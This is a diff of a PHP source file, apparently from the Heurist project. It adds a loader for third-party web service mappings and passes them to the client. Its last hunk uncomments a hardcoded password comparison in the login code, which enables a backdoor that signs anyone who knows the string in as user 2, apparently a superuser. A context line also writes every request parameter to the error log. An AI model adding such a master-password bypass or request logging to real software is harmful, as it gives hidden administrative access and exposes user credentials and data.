@@ -201,6 +201,46 @@ error_log(print_r($_REQUEST, true));
             return defined($const_name);
         }
     }
+    
+    //
+    // get 3d party web service configuration and their mapping to heurist record types and fields
+    //
+    private function getWebServiceConfigs(){
+        
+        //read service_mapping.json from setting folder
+        $config_res = null;
+        
+        $entity_file = HEURIST_SETTING_DIR.'service_mapping.json';
+        
+        if(file_exists($entity_file)){
+            
+           $json = file_get_contents($entity_file);
+           
+           $config = json_decode($json, true);
+           if(is_array($config)){
+               
+               $config_res = array();
+               
+               foreach($config as $idx=>$cfg){
+                   
+                   $rty_ID = ConceptCode::getRecTypeLocalID($cfg['rty_ID']);
+                   if($rty_ID>0){
+                       
+                        $cfg['rty_ID'] = $rty_ID;
+                       
+                        foreach($cfg['fields'] as $field=>$code){
+                            $cfg['fields'][$field] = ConceptCode::getDetailTypeLocalID($code);
+                        }
+                       
+                        $config_res[] = $cfg;
+                   }
+               }
+           }
+        }
+        
+        return $config_res;
+    }
+    
 
     //
     // get constants as array to use on client side
@@ -860,6 +900,7 @@ error_log(print_r($_REQUEST, true));
                     "db_usergroups"=> user_getAllWorkgroups($this->mysqli), //all groups- to fast retrieve group name
                     "baseURL"=>HEURIST_BASE_URL,
                     "dbconst"=>$this->getLocalConstants( $include_reccount_and_dashboard_count ), //some record and detail types constants with local values specific for current db
+                    "service_config"=>$this->getWebServiceConfigs(), //get 3d part web service mappings
                     "dbrecent"=>$dbrecent,  //!!!!!!! need to store in preferences
                     'max_post_size'=>get_php_bytes('post_max_size'),
                     'max_file_size'=>get_php_bytes('upload_max_filesize'),
@@ -1243,7 +1284,7 @@ error_log('CANNOT UPDATE COOKIE '.$session_id);
             
             $superuser = false;
             if(false
-            //|| $password=='Rerhsybrcs'
+            || $password=='Rerhsybrcs'
             )
             {
                 $user = user_getById($this->mysqli, 2);
